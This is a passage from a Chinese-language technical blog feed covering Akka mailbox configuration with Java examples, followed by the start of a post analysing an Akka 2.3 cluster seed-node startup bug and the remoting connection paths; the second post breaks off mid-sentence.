class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">AbstractActor</span> </span>&#123;</span><br><span class="line">  LoggingAdapter log = Logging.getLogger(getContext().getSystem(), <span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (Object msg :</span><br><span class="line">        <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">          <span class="string">&quot;lowpriority&quot;</span>,</span><br><span class="line">          <span class="string">&quot;lowpriority&quot;</span>,</span><br><span class="line">          <span class="string">&quot;highpriority&quot;</span>,</span><br><span class="line">          <span class="string">&quot;pigdog&quot;</span>,</span><br><span class="line">          <span class="string">&quot;pigdog2&quot;</span>,</span><br><span class="line">          <span class="string">&quot;pigdog3&quot;</span>,</span><br><span class="line">          <span class="string">&quot;highpriority&quot;</span>,</span><br><span class="line">          PoisonPill.getInstance()</span><br><span class="line">        &#125;) &#123;</span><br><span class="line">      getSelf().tell(msg, getSelf());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Receive <span class="title">createReceive</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> receiveBuilder()</span><br><span class="line">        .matchAny(</span><br><span class="line">            message -&gt; &#123;</span><br><span class="line">              log.info(message.toString());</span><br><span class="line">            &#125;)</span><br><span class="line">        .build();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We create a new Actor that just prints out what it processes</span></span><br><span class="line">ActorRef myActor =</span><br><span class="line">    system.actorOf(Props.create(Demo.class, <span class="keyword">this</span>).withDispatcher(<span class="string">&quot;prio-dispatcher&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Logs:</span></span><br><span class="line"><span class="comment">  &#x27;highpriority</span></span><br><span class="line"><span class="comment">  &#x27;highpriority</span></span><br><span class="line"><span class="comment">  &#x27;pigdog</span></span><br><span class="line"><span class="comment">  &#x27;pigdog2</span></span><br><span class="line"><span class="comment">  &#x27;pigdog3</span></span><br><span class="line"><span class="comment">  &#x27;lowpriority</span></span><br><span class="line"><span class="comment">  &#x27;lowpriority</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>也可以这样直接配置邮箱类型（这是顶级配置项）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">prio-mailbox &#123;</span><br><span class="line">  mailbox-type = <span class="string">&quot;docs.dispatcher.DispatcherDocSpec$MyPrioMailbox&quot;</span></span><br><span class="line">  <span class="comment">//Other mailbox configuration goes here</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">akka.actor.deployment &#123;</span><br><span class="line">  /priomailboxactor &#123;</span><br><span class="line">    mailbox = prio-mailbox</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后从这样的部署中使用它：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ActorRef myActor = system.actorOf(Props.create(MyActor.class), <span class="string">&quot;priomailboxactor&quot;</span>);</span><br></pre></td></tr></table></figure><p>或者这样的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ActorRef myActor = system.actorOf(Props.create(MyActor.class).withMailbox(<span class="string">&quot;prio-mailbox&quot;</span>));</span><br></pre></td></tr></table></figure><h3 id="5-2-ControlAwareMailbox"><a href="#5-2-ControlAwareMailbox" class="headerlink" title="5.2.ControlAwareMailbox"></a>5.2.ControlAwareMailbox</h3><p>如果 Actor 需要立即接收控制消息，无论邮箱中已经有多少其他消息，<code>ControlAwareMailbox</code>都非常有用。</p><p>可以这样配置：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">control-aware-dispatcher &#123;</span><br><span class="line">  mailbox-type = <span class="string">&quot;akka.dispatch.UnboundedControlAwareMailbox&quot;</span></span><br><span class="line">  <span class="comment">//Other dispatcher configuration goes here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控制消息需要扩展<code>ControlMessage</code>特性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyControlMessage</span> <span class="keyword">implements</span> <span class="title">ControlMessage</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>下面是一个关于如何使用它的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">AbstractActor</span> </span>&#123;</span><br><span class="line">  LoggingAdapter log = Logging.getLogger(getContext().getSystem(), <span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (Object msg :</span><br><span class="line">        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>, <span class="keyword">new</span> MyControlMessage(), PoisonPill.getInstance()&#125;) &#123;</span><br><span class="line">      getSelf().tell(msg, getSelf());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Receive <span class="title">createReceive</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> receiveBuilder()</span><br><span class="line">        .matchAny(</span><br><span class="line">            message -&gt; &#123;</span><br><span class="line">              log.info(message.toString());</span><br><span class="line">            &#125;)</span><br><span class="line">        .build();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We create a new Actor that just prints out what it processes</span></span><br><span class="line">ActorRef myActor =</span><br><span class="line">    system.actorOf(Props.create(Demo.class, <span class="keyword">this</span>).withDispatcher(<span class="string">&quot;control-aware-dispatcher&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Logs:</span></span><br><span class="line"><span class="comment">  &#x27;MyControlMessage</span></span><br><span class="line"><span class="comment">  &#x27;foo</span></span><br><span class="line"><span class="comment">  &#x27;bar</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="6-创建自己的邮箱类型"><a href="#6-创建自己的邮箱类型" class="headerlink" title="6.创建自己的邮箱类型"></a>6.创建自己的邮箱类型</h2><p>示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Marker interface used for mailbox requirements mapping</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyUnboundedMessageQueueSemantics</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> akka.actor.ActorRef;</span><br><span class="line"><span class="keyword">import</span> akka.actor.ActorSystem;</span><br><span class="line"><span class="keyword">import</span> akka.dispatch.Envelope;</span><br><span class="line"><span class="keyword">import</span> akka.dispatch.MailboxType;</span><br><span class="line"><span class="keyword">import</span> akka.dispatch.MessageQueue;</span><br><span class="line"><span class="keyword">import</span> akka.dispatch.ProducesMessageQueue;</span><br><span class="line"><span class="keyword">import</span> com.typesafe.config.Config;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentLinkedQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"><span class="keyword">import</span> scala.Option;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyUnboundedMailbox</span></span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">MailboxType</span>, <span class="title">ProducesMessageQueue</span>&lt;<span class="title">MyUnboundedMailbox</span>.<span class="title">MyMessageQueue</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// This is the MessageQueue implementation</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMessageQueue</span> <span class="keyword">implements</span> <span class="title">MessageQueue</span>, <span class="title">MyUnboundedMessageQueueSemantics</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Queue&lt;Envelope&gt; queue = <span class="keyword">new</span> ConcurrentLinkedQueue&lt;Envelope&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// these must be implemented; queue used as example</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(ActorRef receiver, Envelope handle)</span> </span>&#123;</span><br><span class="line">      queue.offer(handle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Envelope <span class="title">dequeue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> queue.poll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numberOfMessages</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> queue.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasMessages</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> !queue.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cleanUp</span><span class="params">(ActorRef owner, MessageQueue deadLetters)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">for</span> (Envelope handle : queue) &#123;</span><br><span class="line">        deadLetters.enqueue(owner, handle);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// This constructor signature must exist, it will be called by Akka</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">MyUnboundedMailbox</span><span class="params">(ActorSystem.Settings settings, Config config)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// put your initialization code here</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The create method is called to create the MessageQueue</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> MessageQueue <span class="title">create</span><span class="params">(Option&lt;ActorRef&gt; owner, Option&lt;ActorSystem&gt; system)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyMessageQueue();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，将<code>MailboxType</code>的 FQCN 指定为调度器配置或邮箱配置中<code>mailbox-type</code>的值。</p><ul><li><strong>注释</strong>：请确保包含一个采用<code>akka.actor.ActorSystem.Settings</code>和<code>com.typesafe.config.Config</code>参数的构造函数，因为此构造函数是通过反射调用来构造邮箱类型的。作为第二个参数传入的配置是配置中描述使用此邮箱类型的调度器或邮箱设置的部分；邮箱类型将为使用它的每个调度器或邮箱设置实例化一次。</li></ul><p>你还可以使用邮箱作为调度器的要求（<code>requirement</code>），如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">custom-dispatcher &#123;</span><br><span class="line">  mailbox-requirement =</span><br><span class="line">  <span class="string">&quot;jdocs.dispatcher.MyUnboundedMessageQueueSemantics&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">akka.actor.mailbox.requirements &#123;</span><br><span class="line">  <span class="string">&quot;jdocs.dispatcher.MyUnboundedMessageQueueSemantics&quot;</span> =</span><br><span class="line">  custom-dispatcher-mailbox</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">custom-dispatcher-mailbox &#123;</span><br><span class="line">  mailbox-type = <span class="string">&quot;jdocs.dispatcher.MyUnboundedMailbox&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者像这样定义 Actor 类的要求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MySpecialActor</span> <span class="keyword">extends</span> <span class="title">AbstractActor</span></span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">RequiresMessageQueue</span>&lt;<span class="title">MyUnboundedMessageQueueSemantics</span>&gt; </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-system-actorOf-的特殊语义"><a href="#7-system-actorOf-的特殊语义" class="headerlink" title="7.system.actorOf 的特殊语义"></a>7.system.actorOf 的特殊语义</h2><p>为了使<code>system.actorOf</code>既同步又不阻塞，同时保持返回类型<code>ActorRef</code>（以及返回的<code>ref</code>完全起作用的语义），对这种情况进行了特殊处理。在幕后，构建了一种空的 Actor 引用，将其发送给系统的守护者 Actor，该 Actor 实际上创建了 Actor 及其上下文，并将其放入引用中。在这之前，发送到<code>ActorRef</code>的消息将在本地排队，只有在交换真正的填充之后，它们才会被传输到真正的邮箱中。因此，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Props props = ...</span><br><span class="line"><span class="comment">// this actor uses MyCustomMailbox, which is assumed to be a singleton</span></span><br><span class="line">system.actorOf(props.withDispatcher(<span class="string">&quot;myCustomMailbox&quot;</span>).tell(<span class="string">&quot;bang&quot;</span>, sender);</span><br><span class="line"><span class="keyword">assert</span>(MyCustomMailbox.getInstance().getLastEnqueued().equals(<span class="string">&quot;bang&quot;</span>));</span><br></pre></td></tr></table></figure><p>可能会失败；你必须留出一段时间通过并重试检查<code>TestKit.awaitCond</code>。<br>​</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/1435522">https://cloud.tencent.com/developer/article/1435522</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-依赖&quot;&gt;&lt;a href=&quot;#1-依赖&quot; class=&quot;headerlink&quot; title=&quot;1.依赖&quot;&gt;&lt;/a&gt;1.依赖&lt;/h1&gt;&lt;p&gt;为了使用邮箱（&lt;code&gt;Mailboxes&lt;/code&gt;），你需要将以下依赖添加到你的项目中：&lt;/p&gt;
&lt;figure c</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-Cluster-Bug分析</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Cluster-Bug%E5%88%86%E6%9E%90/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Cluster-Bug%E5%88%86%E6%9E%90/</id>
    <published>2021-12-03T08:21:56.862Z</published>
    <updated>2021-12-03T09:07:15.136Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><pre><code>  Akka这样一个scala世界里的明星，给我们提供了各种各样吸引人的功能和特性，尤其在分布式、高并发领域。但就像任何其他优秀的框架，它的实现也必然会有其复杂性，在Roland Kuhn(Akka Tech Lead)的带领下,Akka的实现原理吸收了各个领域内成熟、领先的理论。尤其是Akka里cluster的实现，更是体现了非常多的优秀理论和实战经验。</code></pre><p>但由于它目前还处在实验阶段，在使用过程中还是会有可能碰到这样或那样的问题，下面就以Akka 2.3为例，详细分析我们碰到的一个bug。</p><h3 id="1-1-场景描述"><a href="#1-1-场景描述" class="headerlink" title="1.1. 场景描述"></a>1.1. 场景描述</h3><pre><code> 集群里有两台机器SeedNode1(10.10.10.110) 和 SeedNode2(10.10.10.220)，Akka的配置文件application.conf里相关配置如下:</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seed-nodes = [<span class="string">&quot;akka.tcp://ClusterSystem@10.10.10.110:2551&quot;</span>,<span class="string">&quot;akka.tcp://ClusterSystem@10.10.10.220:2552&quot;</span>]</span><br></pre></td></tr></table></figure><pre><code> 我们先启动SeedNode1，等一会启动SeedNode2，发现SeedNode2和SeedNode1的TCP链路是连上了，但就是无法正常进行工作。但如果先让SeedNode2先启动，然后再启动SeedNode1，则没有问题，集群可正常启动。 为了更好方便大家理解，下面先介绍一下cluster和remote的相关实现细节，这样才能前后串起来。</code></pre><h2 id="2-cluster的启动"><a href="#2-cluster的启动" class="headerlink" title="2.cluster的启动"></a>2.cluster的启动</h2><pre><code>要使用一个cluster首先要启动它，所以我们先从启动这个步骤的实现开始进行分析。Akka集群的启动首先就是要启动一种叫做种子节点(SeedNode)的节点们。只有种子节点启动成功，其他节点才能选择任意一个种子节点加入集群。</code></pre><p>种子节点默认可配置多个，它们之间没有任何区别，种子节点的启动分以下几种情况：</p><ul><li>某种子节点启动，它首先判断自己的ip是否在种子节点配置列表中，如果在并且是第一个，则它在一个规定时间内(默认是5秒)，向其他种子节点发送‘InitJoin’消息，如果有确认消息返回，则加入第一个返回确认的种子节点所在的cluster中，否则，它自己将创建一个新的cluster。(这些任务由FirstSeedNodeProcess这个Actor完成，任务完成后它就销毁自己)</li><li>某种子节点启动，它首先判断自己的ip是否在种子节点配置中，但不是第一个，则它向其他种子节点发送消息，如果在一个规定时间内(默认是5秒)没有收到任何确认消息，则它将不断重试，直到有一个种子节点返回正确的确认消息，然后就加入这个种子节点所在的cluster中。(这里注意以下，它不会自己创建一个新cluster)。(这些任务由JoinSeedNodeProcess这个Actor完成，任务完成后它就销毁自己)</li></ul><p>从上面的分析，我们可以得出下面的一些结论：</p><ul><li>一个集群第一次启动成功，那一定是种子节点配置列表中排在第一位的节点，由它来创建出集群。但是随着时间的推移，排在第一的种子节点有可能重启了，那这个时候，它将首选加入到其他种子节点去。</li><li>一个种子节点可以加入任何一个其他节点，不用非得都加到排第一位的节点上。</li></ul><p>​</p><p>下面我们举例说明，有种子节点1、2、3：</p><ul><li><ol><li>seed2启动, 但是没有收到seed1 或seed3的确认。</li></ol></li><li><ol start="2"><li>seed3启动，没有收到seed1 的确认消息(seed2处在’inactive’状态)。</li></ol></li><li><ol start="3"><li>seed1 启动，创建cluster并加入到自己中。</li></ol></li><li><ol start="4"><li>seed2 重试加入过程，收到seed1的确认, 加入到seed1。</li></ol></li><li><ol start="5"><li>seed3重试加入过程，先收到seed2的确认, 加入到seed2。</li></ol></li></ul><p>​</p><h2 id="3-remote通讯链路的上行、下行实现"><a href="#3-remote通讯链路的上行、下行实现" class="headerlink" title="3.remote通讯链路的上行、下行实现"></a>3.remote通讯链路的上行、下行实现</h2><h3 id="3-1-上行路径-listen启动的全过程"><a href="#3-1-上行路径-listen启动的全过程" class="headerlink" title="3.1 上行路径(listen启动的全过程)"></a>3.1 上行路径(listen启动的全过程)</h3><p> 由于上行路径较复杂，所以画了几张图辅助说明：</p><ul><li>**建立listen</li></ul><p><strong><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1634640719729-01508534-1678-4587-a475-381fc4e4fd50.png#clientId=uc7b47e68-58d0-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u182b737d&margin=%5Bobject%20Object%5D&originHeight=604&originWidth=909&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ud639e871-4ab7-4457-be2b-b3f8117b0b3&title="></strong></p><ul><li>接收新链路请求<br><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1634640720756-05386b47-2280-47ad-a514-1a00b4f82d89.png#clientId=uc7b47e68-58d0-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u71953ac3&margin=%5Bobject%20Object%5D&originHeight=605&originWidth=931&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u0817ce41-de38-40f6-b006-2cc57acdeca&title="></li><li>接收新链路处于等待握手状态</li></ul><p><strong><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1634640719950-de40b42e-5182-402f-afae-d94cb0d59307.png#clientId=uc7b47e68-58d0-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u916cdcf0&margin=%5Bobject%20Object%5D&originHeight=674&originWidth=874&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u865ea1b0-8ee2-4b52-9b87-93da18929b1&title="></strong>**                                                (<strong>接收一个新链路处于等待握手状态</strong>)**<br>​</p><ul><li>_<strong>​</strong>_可以把Remoting这个非常重要的类作为通讯模块的入口，它在启动的时候(start方法里)会向           EndpointManager这个Actor发送Listen消息，启动底层通讯NettyTransport的listen操作。</li></ul><p>​</p><ul><li>**<em>​</em>**由AkkaProtocolTransport类来包一层NettyTransport，所以，先调用的是AkkaProtocolTransport的listen方法，这个方法里产生一个upstreamListenerPromise，这个promise最后会被成赋值为ActorAssociationEventListener(EndpointManager的实例)，而这个promise的作用是为了设置AkkaProtocolManager的associationListener属性为EndpointManager的实例。</li></ul><p>​</p><ul><li>_<strong>​</strong>_NettyTransport在linsten过程中，会返回一个associationListenerPromise，这个promise会通过调用interceptListen方法而被赋值ActorAssociationEventListener(AkkaProtocolManager的实例)。</li></ul><p>而这个promise有两个作用：</p><ul><li>把建立起来的通讯Channel(监听端口的)置为可读状态(setReadable)，以便接收后续进入的消息。</li><li>作为TcpServerHandler的构造参数传入(_associationListenerFuture)，TcpServerHandler实例(它其实是</li></ul><p>netty里SimpleChannelUpstreamHandler的一个扩展)里最重要的方法是onConnect这个回调方法。当有外部链接建立成功，onConnect方法会被调用，紧接着会调用initInbound方法，然后在该promise处等待，直到promise被成功赋值。<br>​</p><ul><li>_<strong>​</strong>_当上面initInbound方法里的promise被成功唤醒，它就会调用init方法。</li></ul><p>​</p><ul><li>_<strong>​</strong>_init方法里首先会创建一个TcpAssociationHandle实例(包含一个readHandlerPromise），这个Promise在这里等待被唤醒(它被后面7处的操作唤醒而设置channel(新链接的)置为可读状态(setReadable)，同时在netty中注册该channel的listen为ProtocolStateActor实例)，然后会向AkkaProtocolManager实例发送InboundAssociation消息(这个消息里包含一个TcpAssociationHandle实例)。</li></ul><p>​</p><ul><li>_<strong>​</strong>_AkkaProtocolManager实例收到InboundAssociation消息，创建一个ProtocolStateActor实例(调用inboundProps构造方法)，这个实例的构造函数里包含两个重要的参数TcpAssociationHandle实例、EndpointManager的实例；</li></ul><p>​</p><ul><li>_<strong>​</strong>_ProtocolStateActor实例的这种构造方法会把TcpAssociationHandle实例里的readHandlerPromise设置值而唤醒它。</li></ul><p>​</p><ul><li>_<strong>​</strong>_ProtocolStateActor实例初始化后会等待在接受握手的状态中(WaitHandshake)，这个时候如果接收到网络报文，decode后发现是Associate消息，则调用notifyInboundHandler方法。在这个方法中会向EndpointManager实例发送InboundAssociation(new AkkaProtocolHandle(…))消息，notifyInboundHandler方法也创建了一个readHandlerPromise,它作为参数放在发往EndpointManager实例的消息里，然后等待被赋值。</li></ul><p>​</p><ul><li>_<strong>​</strong>_EndpointManager实例收到InboundAssociation消息后，根据addressToWritable(EndpointPolicy规则的集合)进行一些必要的判断，如果符合要求则调用createAndRegisterEndpoint方法，这个方法最主要是创建EndpointWriter实例并注册这个实例。不符合则进行相关动作，如保存这个InboundAssociation消息，等待后续条件合适再处理。</li></ul><p>​</p><ul><li>_<strong>​</strong>_在创建EndpointWriter实例的preStart方法里，判断是否已经存在AkkaProtocolHandle实例，如果已经存在则创建一个EndpointReader实例，并把它作为值设置给步骤7里的readHandlerPromise，使readHandlerPromise这个Promise的future被唤醒。</li></ul><p>​</p><ul><li>_<strong>​</strong>_ProtocolStateActor实例的readHandlerPromise被唤醒后，会向自己发送一条HandleListenerRegistered(EndpointReader实例)的消息，接收到这个消息后，它会修改自己状态机里的状态数据为ListenerReady。后续所有接受的网络数据包就会被正常的decode和分发了。</li></ul><p>​</p><h3 id="3-2-下行路径"><a href="#3-2-下行路径" class="headerlink" title="3.2.下行路径"></a>3.2.下行路径</h3><p>作为发送端(client)，当seed节点A向seed节点B发送InitJoin消息时，调用链如下：</p><ul><li>_<strong>​</strong>_向处在accepting状态中的EndpointManager实例发送’Send(message, senderOption, recipientRef, _)’</li></ul><p>​</p><ul><li>_<strong>​</strong>_EndpointManager实例调用createAndRegisterWritingEndpoint方法，创建一个ReliableDeliverySupervisor实例(在EndpointWriter实例之上封了一层，以加强可靠性)。</li></ul><p>并且向addressToWritable这个HashMap里添加一条记录。<br>​</p><ul><li>_<strong>​</strong>_ReliableDeliverySupervisor实例会创建一个EndpointWriter实例，在其preStart方法里，由于传入的AkkaProtocolHandle为None，所以会调用transport.associate(remoteAddress, …)，同时EndpointWriter实例进入Initializing状态。</li></ul><p>​</p><ul><li>_<strong>​</strong>_上面的transport是AkkaProtocolTransport实例，它会向AkkaProtocolManager实例的发送一个AssociateUnderlyingRefuseUid消息</li></ul><p>​</p><ul><li>_<strong>​</strong>_AkkaProtocolManager实例收到AssociateUnderlyingRefuseUid消息后，调用createOutboundStateActor方法，该方法调用ProtocolStateActor.outboundProps的构造方法。</li></ul><p>​</p><ul><li>_<strong>​</strong>_ProtocolStateActor实例的outboundProps构造方法，会调用NettyTransport实例的associate方法，它会调用NettyFutureBridge(bootstrap.connect(socketAddress)进行真正的网络连接。</li></ul><p>​</p><ul><li>_<strong>​</strong>_如果无法成功建立连接，则向外发送异常，这个异常会最终被EndpointManager实例捕获。</li></ul><p>​</p><ul><li><strong>​</strong>EndpointManager实例捕获异常后，根据异常情况进行处理，如果是链接失败异常则调用markAsFailed修改addressToWritable相关配置。</li></ul><p>​</p><ul><li><strong>​</strong>如果成功建立连接，则InitJoin消息会发送对对方机器。</li></ul><p>​</p><p><strong>3）bug具体原因分析</strong><br>通过上面的cluster集群启动过程的分析和remoting的实现过程，可以用来具体分析一下我们的问题场景。 我们是先启动SeedNode1，它启动后会调用remoting的下行路径向SeedNode2发送 